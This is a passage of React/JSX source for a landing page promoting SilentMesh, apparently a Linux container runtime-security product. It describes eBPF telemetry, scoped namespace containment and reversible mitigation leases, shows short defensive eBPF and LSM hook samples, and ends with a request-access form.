                    <h3 className="font-['Space_Grotesk'] text-white text-base font-semibold mb-2">Reactive Alerts</h3>
                    <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed">
                      Traditional agents log alerts after binary execution has completed. SilentMesh operates inline, capturing signals at syscall entry points.
                    </p>
                  </div>
                  <div className="border-l-2 border-red-500/30 pl-6">
                    <h3 className="font-['Space_Grotesk'] text-white text-base font-semibold mb-2">Brittle Blocking</h3>
                    <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed">
                      Enforcing binary "kill" commands crashes entire host pods, triggering cascading network outages. We contain capabilities, not workloads.
                    </p>
                  </div>
                  <div className="border-l-2 border-red-500/30 pl-6">
                    <h3 className="font-['Space_Grotesk'] text-white text-base font-semibold mb-2">Irreversibility</h3>
                    <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed">
                      A single false positive blocks traffic permanently until an SRE logs in. SilentMesh makes every operational containment fully reversible.
                    </p>
                  </div>
                </div>
              </div>
            </SectionWrapper>

            {/* 3. PROGRESSIVE TRUST VISUALIZATION */}
            <SectionWrapper id="progressive-trust" activeStateName="evaluate" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">03 ARCHITECTURAL PATHWAYS</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  PROGRESSIVE<br/>TRUST LAYERS.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-12">
                  Security shouldn't be binary. SilentMesh progressively scales validation steps based on execution threat models:
                </p>
                <div className="relative border-l border-white/5 ml-4 pl-8 space-y-10">
                  {[
                    { title: 'OBSERVE', desc: 'Map execution signatures using non-intrusive eBPF telemetry hooks.' },
                    { title: 'EVALUATE', desc: 'Assess container execution patterns against drift baselines.' },
                    { title: 'SIMULATE', desc: 'Execute in-memory sandbox isolation tests to measure workload impact.' },
                    { title: 'MITIGATE', desc: 'Apply container namespace capabilities limiters dynamically.' },
                    { title: 'ROLLBACK', desc: 'Restore capabilities back to steady state in milliseconds.' }
                  ].map((s, i) => (
                    <div key={i} className="relative">
                      <span className="absolute -left-[41px] top-1 w-5 h-5 rounded-full bg-[#090a0f] border border-[#00c9a7] flex items-center justify-center font-mono text-[8px] text-[#00c9a7] font-bold">
                        {i + 1}
                      </span>
                      <h4 className="font-['Space_Grotesk'] text-white font-semibold text-sm mb-1.5">{s.title}</h4>
                      <p className="text-[11px] text-gray-500 font-light leading-relaxed">{s.desc}</p>
                    </div>
                  ))}
                </div>
              </div>
            </SectionWrapper>

            {/* 4. RUNTIME ORCHESTRATION CANVAS SECTION */}
            <SectionWrapper id="orchestration-canvas" activeStateName="simulate" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">04 ORCHESTRATION INTERACTION</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-6 tracking-tight">
                  PLAYGROUND.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-8">
                  Use the control panel on the right grid to manually trigger runtime states. Observe the interactive signals propagate, evaluate risks, simulate constraints, and rollback states in real time.
                </p>
                {/* Responsive notice: show canvas here if on mobile */}
                <div className="block lg:hidden my-6">
                  <OrchestrationCanvas activeState={activeState} overrideState={overrideState} onInteractiveSelect={setOverrideState} />
                  <div className="mt-4">
                    <ConsoleLogs activeState={activeState} overrideState={overrideState} />
                  </div>
                </div>
                <div className="space-y-4 font-mono text-[10px] text-gray-500 mt-6">
                  <p className="flex items-center gap-3"><span className="w-1.5 h-1.5 rounded-full bg-[#00c9a7]"/> Hover nodes to view telemetry details.</p>
                  <p className="flex items-center gap-3"><span className="w-1.5 h-1.5 rounded-full bg-[#00c9a7]"/> Click any state below the canvas to override scrolling.</p>
                </div>
              </div>
            </SectionWrapper>

            {/* 5. SCOPED CONTAINMENT VISUALIZATION */}
            <SectionWrapper id="scoped-containment" activeStateName="mitigate" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">05 MITIGATION STRATEGY</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  SCOPED<br/>CONTAINMENT.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-6">
                  When a process deviates, traditional security tools block entire host IPs or terminate container pods. This causes instant operational downtime.
                </p>
                <div className="p-5 border border-white/5 bg-[#12131a] rounded-lg mb-8">
                  <p className="text-xs text-gray-300 font-light leading-relaxed">
                    SilentMesh restructures Linux namespaces on the fly. We containerize the compromised process thread by stripping privileges, keeping the main network loop and DB queries running smoothly.
                  </p>
                </div>
                <div className="grid grid-cols-2 gap-6 text-left">
                  <div>
                    <span className="text-white font-['Space_Grotesk'] font-semibold block mb-1 text-sm">Target Scope</span>
                    <p className="text-[11px] text-gray-500 leading-normal">PID and Linux control group namespaces only.</p>
                  </div>
                  <div>
                    <span className="text-white font-['Space_Grotesk'] font-semibold block mb-1 text-sm">Cluster Latency</span>
                    <p className="text-[11px] text-gray-500 leading-normal">0.00ms disruption to adjacent pods.</p>
                  </div>
                </div>
              </div>
            </SectionWrapper>

            {/* 6. REVERSIBILITY BY DESIGN */}
            <SectionWrapper id="reversibility" activeStateName="rollback" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">06 LEASE & RECOVERY</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  REVERSIBILITY<br/>BY DESIGN.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-8">
                  Every mitigation action in SilentMesh is applied as a lease. The kernel-level namespace modifications are cached, allowing SRE operators to revert policies instantly:
                </p>
                <div className="border border-white/5 bg-[#12131a] p-5 rounded-lg font-mono text-[10px] space-y-2 text-gray-400">
                  <div className="text-[#00c9a7]">// REVERT INSTRUCTIONS REGISTER</div>
                  <div>ID: SM-LEASE-772-B</div>
                  <div>RESTORE CAPABILITIES: sys_net_admin, sys_ptrace</div>
                  <div>STATUS: PENDING OPERATOR SIGN-OFF</div>
                  <div className="text-gray-600">// No system reboots or VM refreshes required.</div>
                </div>
              </div>
            </SectionWrapper>

            {/* 7. RUNTIME BEHAVIOR MODEL */}
            <SectionWrapper id="behavior-model" activeStateName="observe" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">07 EXECUTION DESIGN</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  BEHAVIOR MODEL.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-6">
                  SilentMesh does not search for known signatures, static file checksums, or malicious strings. It profiles container executions in kernel-space, building an immutable behavior schema in memory.
                </p>
                <p className="text-xs text-gray-500 font-light leading-relaxed">
                  Deviation is calculated based on abnormal system calls, container-namespace leaks, or unauthorized binary forks, allowing us to capture zero-day exploits before they execute.
                </p>
              </div>
            </SectionWrapper>

            {/* 8. LINUX-NATIVE TELEMETRY */}
            <SectionWrapper id="telemetry" activeStateName="telemetry" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">08 PROGRAMMABLE KERNEL</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  LINUX-NATIVE.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-8">
                  We use standard eBPF maps and Linux Security Modules (LSM) hooks. Zero custom kernel binaries, zero modules. High-speed hook tracing that operates safely in the compiler pipeline.
                </p>

                {/* Tabs */}
                <div className="flex border-b border-white/5 mb-4">
                  <button onClick={() => setActiveTab('ebpf')} className={`px-4 py-2 font-mono text-[9px] uppercase tracking-wider border-b-2 ${activeTab === 'ebpf' ? 'border-[#00c9a7] text-white' : 'border-transparent text-gray-500'}`}>eBPF Code</button>
                  <button onClick={() => setActiveTab('lsm')} className={`px-4 py-2 font-mono text-[9px] uppercase tracking-wider border-b-2 ${activeTab === 'lsm' ? 'border-[#00c9a7] text-white' : 'border-transparent text-gray-500'}`}>LSM Check</button>
                </div>

                <div className="bg-[#0c0d14] border border-white/[0.04] p-4 rounded-lg font-mono text-[10px] text-gray-400 overflow-x-auto">
                  {activeTab === 'ebpf' ? (
                    <pre className="leading-relaxed">
{`SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;

    // Filter namespace matches
    struct process_config *cfg = bpf_map_lookup_elem(&cfg_map, &pid);
    if (!cfg) return 0;

    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, cfg, sizeof(*cfg));
    return 0;
}`}
                    </pre>
                  ) : (
                    <pre className="leading-relaxed">
{`SEC("lsm/bprm_check_security")
int BPF_PROG(bprm_check, struct linux_binprm *bprm) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    
    if (is_compromised_namespace(pid)) {
        // Enforce scoped restriction 
        return -EACCES; 
    }
    return 0;
}`}
                    </pre>
                  )}
                </div>
              </div>
            </SectionWrapper>

            {/* 9. OPERATIONAL SAFETY (WHAT WE DO NOT DO) */}
            <SectionWrapper id="safety-boundaries" activeStateName="evaluate" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">09 DESIGN BOUNDARIES</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-10 tracking-tight">
                  OPERATIONAL<br/>SAFETY.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-10">
                  Trust is built on clear limitations. Here is exactly what SilentMesh <strong className="text-white font-medium">does not do</strong> in production:
                </p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="border border-white/5 bg-[#12131a] p-4 rounded">
                    <span className="text-[9px] font-mono text-red-400 block mb-1">NO PACKET LOSS</span>
                    <p className="text-[10px] text-gray-500 font-light leading-relaxed">
                      We never drop TCP connections or inject resets. The network flow is always unaffected.
                    </p>
                  </div>
                  <div className="border border-white/5 bg-[#12131a] p-4 rounded">
                    <span className="text-[9px] font-mono text-red-400 block mb-1">NO KERNEL WRITE</span>
                    <p className="text-[10px] text-gray-500 font-light leading-relaxed">
                      We do not modify kernel memory structures or patch binaries on disk. eBPF bytecode only.
                    </p>
                  </div>
                  <div className="border border-white/5 bg-[#12131a] p-4 rounded">
                    <span className="text-[9px] font-mono text-red-400 block mb-1">NO RAW CLOUD LOGS</span>
                    <p className="text-[10px] text-gray-500 font-light leading-relaxed">
                      Telemetry data is evaluated locally at node-level. No raw application payloads leave the node boundary.
                    </p>
                  </div>
                  <div className="border border-white/5 bg-[#12131a] p-4 rounded">
                    <span className="text-[9px] font-mono text-red-400 block mb-1">NO FS MODIFICATION</span>
                    <p className="text-[10px] text-gray-500 font-light leading-relaxed">
                      We never rewrite configuration directories or overwrite containers filesystems.
                    </p>
                  </div>
                </div>
              </div>
            </SectionWrapper>

            {/* 10. COMPATIBILITY LAYER */}
            <SectionWrapper id="compatibility" activeStateName="compatibility" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">10 COMPATIBILITY MATRIX</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-10 tracking-tight">
                  INTEGRATION<br/>LAYER.
                </h2>
                
                {/* Filters */}
                <div className="flex gap-2 mb-6">
                  <button onClick={() => setCompatFilter('all')} className={`font-mono text-[8px] uppercase tracking-wider px-3 py-1 border ${compatFilter === 'all' ? 'border-[#00c9a7] text-[#00c9a7]' : 'border-white/5 text-gray-500'}`}>All</button>
                  <button onClick={() => setCompatFilter('kernel')} className={`font-mono text-[8px] uppercase tracking-wider px-3 py-1 border ${compatFilter === 'kernel' ? 'border-[#00c9a7] text-[#00c9a7]' : 'border-white/5 text-gray-500'}`}>Kernels</button>
                  <button onClick={() => setCompatFilter('cloud')} className={`font-mono text-[8px] uppercase tracking-wider px-3 py-1 border ${compatFilter === 'cloud' ? 'border-[#00c9a7] text-[#00c9a7]' : 'border-white/5 text-gray-500'}`}>Clouds</button>
                </div>

                <div className="space-y-3 font-mono text-[10px] text-gray-400">
                  {[
                    { name: 'Linux Kernels 5.4+ (LTS)', detail: 'eBPF Maps, tracepoint probes', cat: 'kernel' },
                    { name: 'Red Hat Enterprise Linux 8+', detail: 'LSM Hooks, BPF security config', cat: 'kernel' },
                    { name: 'Amazon Web Services (EKS)', detail: 'AWS VPC CNI, IAM mapping compat', cat: 'cloud' },
                    { name: 'Google Cloud (GKE)', detail: 'Shielded GKE nodes, ContainerOS', cat: 'cloud' },
                    { name: 'Microsoft Azure (AKS)', detail: 'Azure CNI overlay support', cat: 'cloud' },
                    { name: 'ARM64 & x86_64 Archs', detail: 'Native instruction compilation', cat: 'arch' }
                  ].filter(i => compatFilter === 'all' || i.cat === compatFilter).map((matrix, idx) => (
                    <div key={idx} className="flex justify-between border-b border-white/5 pb-2.5">
                      <div>
                        <span className="text-white block font-medium">{matrix.name}</span>
                        <span className="text-gray-500 text-[9px]">{matrix.detail}</span>
                      </div>
                      <span className="text-[#00c9a7] text-[9px]">COMPATIBLE</span>
                    </div>
                  ))}
                </div>
              </div>
            </SectionWrapper>

            {/* 11. RUNTIME WORKFLOW EXPERIENCE */}
            <SectionWrapper id="workflow" activeStateName="observe" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">11 THE LIFECYCLE</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-10 tracking-tight">
                  RUNTIME LIFE.
                </h2>
                
                {/* Stepper buttons */}
                <div className="flex flex-col gap-3">
                  {workflowSteps.map((step, idx) => (
                    <div
                      key={idx}
                      onClick={() => {
                        setActiveStep(idx);
                        setOverrideState(step.state);
                      }}
                      className={`p-4 border text-left cursor-pointer transition-all duration-300 ${
                        activeStep === idx ? 'border-[#00c9a7] bg-[#12131a]' : 'border-white/5 bg-transparent'
                      }`}
                    >
                      <span className="font-mono text-[8px] text-[#00c9a7] tracking-widest block font-bold mb-1">STEP 0{idx+1} {step.title}</span>
                      <p className="text-[11px] text-gray-500 font-light leading-relaxed">{step.desc}</p>
                    </div>
                  ))}
                </div>
              </div>
            </SectionWrapper>

            {/* 12. CTA ENVIRONMENT */}
            <SectionWrapper id="cta" activeStateName="observe" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">12 ACCESS REGISTRY</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-8 tracking-tight">
                  REQUEST ACCESS.
                </h2>
                <p className="text-xs md:text-sm text-gray-400 font-light leading-relaxed mb-8">
                  SilentMesh is currently in a controlled early evaluation phase. Register your interest below to trace workloads with safety-first containment constraints.
                </p>

                <form action="https://formspree.io/f/xvonzgkb" method="POST" onSubmit={handleFormSubmit} className="glass p-6 md:p-8 space-y-6 relative overflow-hidden rounded-lg">
                  <div className="scan-line" />
                  
                  <div>
                    <label htmlFor="email" className="block font-mono text-[9px] text-gray-500 uppercase tracking-widest mb-1.5">Email Address</label>
                    <input id="email" type="email" name="email" required placeholder="name@company.com"
                      className="w-full bg-[#090a0f] border border-white/5 px-4 py-3 text-xs text-white placeholder:text-gray-700 focus:outline-none focus:border-[#00c9a7]/30 transition-colors" />
                  </div>
                  <div>
                    <label htmlFor="message" className="block font-mono text-[9px] text-gray-500 uppercase tracking-widest mb-1.5">Infrastructure Architecture / Trace Goals</label>
                    <textarea id="message" name="message" rows="3" placeholder="What container runtimes are you running?"
                      className="w-full bg-[#090a0f] border border-white/5 px-4 py-3 text-xs text-white placeholder:text-gray-700 focus:outline-none focus:border-[#00c9a7]/30 transition-colors resize-none" />
                  </div>

                  <button type="submit" disabled={formStatus === 'loading'}
                    className="cta-primary w-full py-3.5 bg-[#00c9a7] text-[#090a0f] font-mono text-xs uppercase tracking-wider font-semibold hover:shadow-[0_0_20px_rgba(0,201,167,0.15)] transition-all disabled:opacity-50">
                    {formStatus === 'loading' ? 'Registering...' : 'Request Access'}
                  </button>

                  <AnimatePresence>
                    {formStatus === 'success' && (
                      <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                        className="mt-3 p-3 bg-[#00c9a7]/10 border border-[#00c9a7]/20 text-[#00c9a7] text-[10px] font-mono text-center">
                        ✓ ACCESS REGISTRY SUBMITTED. OUR INFRASTRUCTURE TEAM WILL CONTACT YOU.
                      </motion.div>
                    )}
                    {formStatus === 'error' && (
                      <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                        className="mt-3 p-3 bg-red-950/20 border border-red-500/20 text-[#ff4a5a] text-[10px] font-mono text-center">
                        ✕ SUBMISSION FAILED. PLEASE VERIFY DETAILS AND RETRY.
                      </motion.div>
                    )}
                  </AnimatePresence>
                </form>
              </div>
            </SectionWrapper>
            
          </div>

          {/* RIGHT COLUMN: STICKY RUNTIME ORCHESTRATION CANVAS & SHELL LOGS (Desktop only) */}
          <div className="hidden lg:block sticky-canvas-wrapper pr-6 md:pr-12 pl-8">
            <div className="flex flex-col gap-6 w-full items-center justify-center">
              <OrchestrationCanvas activeState={activeState} overrideState={overrideState} onInteractiveSelect={setOverrideState} />
              <ConsoleLogs activeState={activeState} overrideState={overrideState} />
            </div>
          </div>

        </main>

        {/* Global Footer */}
        <footer className="w-full px-6 md:px-12 lg:px-24 py-12 border-t border-white/[0.03] relative z-10 bg-[#090a0f]">
          <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
            <div className="flex items-center gap-3">
              <svg className="w-4 h-4 text-[#00c9a7]" viewBox="0 0 100 100" fill="none" stroke="currentColor" strokeWidth="12">
                <polygon points="50,15 85,35 85,75 50,95 15,75 15,35" />
                <circle cx="50" cy="55" r="15" fill="currentColor" />
              </svg>
              <span className="font-['Space_Grotesk'] text-sm text-white font-semibold">SilentMesh</span>
            </div>
            <div className="flex gap-8 text-[9px] font-mono text-gray-500 uppercase tracking-widest">
              <span>&copy; 2026 SILENTMESH</span>
              <span>MITIGATION LEASES LICENSE</span>
              <span>SRE CONTROL HUB</span>
            </div>
          </div>
        </footer>
      </div>
    </ErrorBoundary>
  );
};

const root = createRoot(document.getElementById('root'));
root.render(<App />);
